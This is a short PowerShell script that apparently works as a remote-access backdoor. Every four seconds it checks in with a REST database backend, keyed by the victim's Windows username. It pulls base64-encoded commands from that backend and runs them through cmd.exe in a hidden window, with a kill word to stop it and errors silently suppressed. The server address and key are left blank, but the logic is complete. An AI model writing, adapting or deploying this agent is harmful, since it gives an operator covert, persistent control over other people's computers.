$BASE_URL = ""
$API_KEY = ""

$h = @{
    "apikey"        = $API_KEY
    "Authorization" = "Bearer $API_KEY"
    "Content-Type"  = "application/json"
    "Prefer"        = "return=representation"
    "Accept"        = "application/vnd.pgrst.object+json"
}

# main loop
while ($true) {
    try {
        $u = "$BASE_URL/clients?username=eq.$env:USERNAME"
        $r = Invoke-RestMethod -Method Patch -Uri $u -Headers $h -Body '{"updated_at": "now()"}'
        if ($r.run -eq $true) {
            Invoke-RestMethod -Method Patch -Uri $u -Headers $h -Body '{"run": false}' | Out-Null
            $c = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($r.cmd))
            if ($c -eq "seppuku") { exit }
            $style = if ($r.visible -eq $true) { "Normal" } else { "Hidden" }
            Start-Process cmd.exe -ArgumentList "/c", $c -WindowStyle $style
        }
    }
    catch {}
    Start-Sleep -Seconds 4
}